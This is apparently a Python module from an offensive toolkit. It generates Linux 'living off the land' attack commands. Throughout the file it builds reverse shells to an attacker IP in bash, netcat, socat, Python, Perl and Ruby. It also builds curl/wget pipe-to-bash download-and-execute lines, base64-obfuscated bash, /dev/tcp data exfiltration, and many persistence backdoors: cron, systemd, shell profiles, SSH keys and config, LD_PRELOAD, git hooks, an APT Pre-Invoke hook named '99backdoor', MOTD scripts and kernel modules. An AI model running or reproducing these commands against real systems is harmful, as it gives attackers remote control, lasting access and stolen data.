"""
Linux Living Off The Land - Linux-specific LOLBAS techniques
Abuses bash, curl, wget, cron, systemd, and other native tools
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from pathlib import Path
from .lolbas_manager import (
    LOLBASExecutor, DownloadExecutor, ExecutionExecutor,
    PersistenceExecutor, ReconExecutor, ExfiltrationExecutor
)

logger = logging.getLogger(__name__)


class LinuxLOL:
    """
    Linux Living Off The Land techniques
    Uses built-in Linux binaries for offensive operations
    """
    
    def __init__(self):
        """Initialize Linux LOLBAS"""
        logger.info("LinuxLOL initialized")
        
    # Download techniques
    
    async def curl_download(self, url: str, output: str) -> str:
        """Download file using curl"""
        cmd = f'curl -s -o {output} {url}'
        logger.info(f"curl download: {url}")
        return cmd
        
    async def wget_download(self, url: str, output: str) -> str:
        """Download file using wget"""
        cmd = f'wget -q -O {output} {url}'
        logger.info(f"wget download: {url}")
        return cmd
        
    async def curl_download_execute(self, url: str) -> str:
        """Download and execute using curl"""
        cmd = f'curl -s {url} | bash'
        logger.info("curl download-execute")
        return cmd
        
    async def wget_download_execute(self, url: str) -> str:
        """Download and execute using wget"""
        cmd = f'wget -q -O- {url} | bash'
        logger.info("wget download-execute")
        return cmd
        
    # Bash techniques
    
    async def bash_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Create bash reverse shell"""
        cmd = f'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'
        logger.info(f"Bash reverse shell to {attacker_ip}:{port}")
        return cmd
        
    async def bash_tcp_connection(self, target: str, port: int, data: str) -> str:
        """Send data via bash TCP connection"""
        cmd = f'echo "{data}" > /dev/tcp/{target}/{port}'
        logger.info("Bash TCP data exfiltration")
        return cmd
        
    async def bash_obfuscation(self, command: str) -> str:
        """Obfuscate bash command"""
        import base64
        encoded = base64.b64encode(command.encode()).decode()
        cmd = f'echo {encoded} | base64 -d | bash'
        logger.info("Bash command obfuscation")
        return cmd
        
    # Cron persistence
    
    async def cron_persistence(self, command: str, schedule: str = '@reboot') -> str:
        """Add cron job for persistence"""
        cmd = f'(crontab -l 2>/dev/null; echo "{schedule} {command}") | crontab -'
        logger.info(f"Cron persistence: {schedule}")
        return cmd
        
    async def cron_at_persistence(self, command: str, time: str = 'now + 1 minute') -> str:
        """Use at command for scheduled execution"""
        cmd = f'echo "{command}" | at {time}'
        logger.info(f"at command scheduling: {time}")
        return cmd
        
    # Systemd persistence
    
    async def systemd_service_persistence(self, service_name: str, exec_start: str) -> str:
        """Create systemd service for persistence"""
        service_content = f'''[Unit]
Description={service_name}
After=network.target

[Service]
Type=simple
ExecStart={exec_start}
Restart=always

[Install]
WantedBy=multi-user.target
'''
        
        service_path = f'/etc/systemd/system/{service_name}.service'
        
        cmd = f'''
echo '{service_content}' > {service_path}
systemctl daemon-reload
systemctl enable {service_name}
systemctl start {service_name}
'''
        logger.info(f"systemd service persistence: {service_name}")
        return cmd
        
    async def systemd_user_service(self, service_name: str, exec_start: str) -> str:
        """Create user-level systemd service"""
        service_path = f'~/.config/systemd/user/{service_name}.service'
        
        cmd = f'''
mkdir -p ~/.config/systemd/user
cat > {service_path} << EOF
[Unit]
Description={service_name}

[Service]
ExecStart={exec_start}

[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable {service_name}
systemctl --user start {service_name}
'''
        logger.info(f"User systemd service: {service_name}")
        return cmd
        
    # Profile/bashrc persistence
    
    async def bashrc_persistence(self, command: str) -> str:
        """Add command to .bashrc"""
        cmd = f'echo "{command}" >> ~/.bashrc'
        logger.info("bashrc persistence")
        return cmd
        
    async def profile_persistence(self, command: str) -> str:
        """Add command to .profile"""
        cmd = f'echo "{command}" >> ~/.profile'
        logger.info("profile persistence")
        return cmd
        
    async def bash_profile_persistence(self, command: str) -> str:
        """Add command to .bash_profile"""
        cmd = f'echo "{command}" >> ~/.bash_profile'
        logger.info("bash_profile persistence")
        return cmd
        
    # SSH persistence
    
    async def ssh_authorized_keys(self, public_key: str) -> str:
        """Add SSH authorized key"""
        cmd = f'''
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "{public_key}" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
'''
        logger.info("SSH authorized_keys persistence")
        return cmd
        
    async def ssh_config_backdoor(self, host: str, proxy_command: str) -> str:
        """Add backdoor to SSH config"""
        config = f'''
Host {host}
    ProxyCommand {proxy_command}
'''
        cmd = f'echo "{config}" >> ~/.ssh/config'
        logger.info("SSH config backdoor")
        return cmd
        
    # File operations
    
    async def tar_exfiltration(self, directory: str, output: str) -> str:
        """Compress and exfiltrate directory"""
        cmd = f'tar czf {output} {directory}'
        logger.info(f"tar archive: {directory}")
        return cmd
        
    async def dd_disk_imaging(self, device: str, output: str) -> str:
        """Image disk using dd"""
        cmd = f'dd if={device} of={output} bs=4M status=progress'
        logger.info(f"dd disk imaging: {device}")
        return cmd
        
    # Network techniques
    
    async def nc_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Netcat reverse shell"""
        cmd = f'nc -e /bin/bash {attacker_ip} {port}'
        logger.info(f"nc reverse shell to {attacker_ip}:{port}")
        return cmd
        
    async def nc_bind_shell(self, port: int) -> str:
        """Netcat bind shell"""
        cmd = f'nc -lvnp {port} -e /bin/bash'
        logger.info(f"nc bind shell on port {port}")
        return cmd
        
    async def socat_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Socat reverse shell"""
        cmd = f'socat tcp-connect:{attacker_ip}:{port} exec:/bin/bash,pty,stderr,setsid,sigint,sane'
        logger.info(f"socat reverse shell to {attacker_ip}:{port}")
        return cmd
        
    # Privilege escalation
    
    async def sudo_preserve_env(self, command: str) -> str:
        """Execute with sudo preserving environment"""
        cmd = f'sudo -E {command}'
        logger.info("sudo with preserved environment")
        return cmd
        
    async def pkexec_execution(self, command: str) -> str:
        """Execute using pkexec"""
        cmd = f'pkexec {command}'
        logger.info("pkexec execution")
        return cmd
        
    # Python techniques
    
    async def python_download(self, url: str, output: str) -> str:
        """Download using Python"""
        cmd = f"python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}', '{output}')\""
        logger.info("Python download")
        return cmd
        
    async def python_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Python reverse shell"""
        py_code = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{attacker_ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
        cmd = f'python3 -c "{py_code}"'
        logger.info("Python reverse shell")
        return cmd
        
    async def python_http_server(self, port: int = 8000, directory: str = '.') -> str:
        """Start Python HTTP server for exfiltration"""
        cmd = f'python3 -m http.server {port} --directory {directory}'
        logger.info(f"Python HTTP server on port {port}")
        return cmd
        
    # Perl techniques
    
    async def perl_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Perl reverse shell"""
        perl_code = f"use Socket;$i='{attacker_ip}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}}"
        cmd = f"perl -e '{perl_code}'"
        logger.info("Perl reverse shell")
        return cmd
        
    # Ruby techniques
    
    async def ruby_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Ruby reverse shell"""
        ruby_code = f"require 'socket';exit if fork;c=TCPSocket.new('{attacker_ip}',{port});while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end"
        cmd = f"ruby -e \"{ruby_code}\""
        logger.info("Ruby reverse shell")
        return cmd
        
    # LD_PRELOAD techniques
    
    async def ld_preload_persistence(self, library_path: str) -> str:
        """Use LD_PRELOAD for persistence"""
        cmd = f'echo "export LD_PRELOAD={library_path}" >> ~/.bashrc'
        logger.info("LD_PRELOAD persistence")
        return cmd
        
    async def ld_preload_execution(self, library: str, command: str) -> str:
        """Execute with LD_PRELOAD"""
        cmd = f'LD_PRELOAD={library} {command}'
        logger.info("LD_PRELOAD execution")
        return cmd
        
    # PAM backdoor
    
    async def pam_backdoor(self, password: str) -> str:
        """Install PAM backdoor"""
        # Would modify /etc/pam.d/ or install malicious PAM module
        logger.info("PAM backdoor installation")
        cmd = f'# PAM backdoor with password: {password}'
        return cmd
        
    # Git hooks
    
    async def git_hook_persistence(self, hook_name: str, command: str, repo_path: str = '.') -> str:
        """Add git hook for persistence"""
        hook_path = f'{repo_path}/.git/hooks/{hook_name}'
        cmd = f'''
cat > {hook_path} << EOF
#!/bin/bash
{command}
EOF
chmod +x {hook_path}
'''
        logger.info(f"Git hook persistence: {hook_name}")
        return cmd
        
    # APT/YUM hijacking
    
    async def apt_pre_invoke(self, command: str) -> str:
        """APT Pre-Invoke persistence"""
        config = f'APT::Update::Pre-Invoke {{"exec {command}";}};'
        cmd = f'echo \'{config}\' > /etc/apt/apt.conf.d/99backdoor'
        logger.info("APT Pre-Invoke persistence")
        return cmd
        
    # Kernel module
    
    async def load_kernel_module(self, module_path: str) -> str:
        """Load kernel module"""
        cmd = f'insmod {module_path}'
        logger.info(f"Loading kernel module: {module_path}")
        return cmd
        
    # Advanced techniques
    
    async def at_command_persistence(self, command: str) -> str:
        """Use at command for persistence"""
        cmd = f'echo "{command}" | at now + 1 minute'
        logger.info("at command persistence")
        return cmd
        
    async def motd_persistence(self, command: str) -> str:
        """Message of the Day persistence"""
        cmd = f'echo "{command}" >> /etc/update-motd.d/00-header'
        logger.info("MOTD persistence")
        return cmd


class BashExecutor(ExecutionExecutor):
    """Bash-based execution"""
    
    def __init__(self):
        super().__init__("Bash Execution", "bash")
        
    def build_command(self, payload: str, method: str = 'direct', **kwargs) -> str:
        if method == 'encoded':
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            return f'echo {encoded} | base64 -d | bash'
        elif method == 'obfuscated':
            # Basic obfuscation
            return f'bash -c "$(echo {payload} | rev | rev)"'
        else:
            return f'bash -c "{payload}"'


class CurlDownloader(DownloadExecutor):
    """Curl-based downloader"""
    
    def __init__(self):
        super().__init__("Curl Download", "curl")
        
    def build_command(self, url: str, output_path: str, **kwargs) -> str:
        return f'curl -s -o {output_path} {url}'


class CronPersistence(PersistenceExecutor):
    """Cron-based persistence"""
    
    def __init__(self):
        super().__init__("Cron Persistence", "crontab")
        
    def build_command(self, payload_path: str, **kwargs) -> str:
        schedule = kwargs.get('schedule', '@reboot')
        return f'(crontab -l 2>/dev/null; echo "{schedule} {payload_path}") | crontab -'
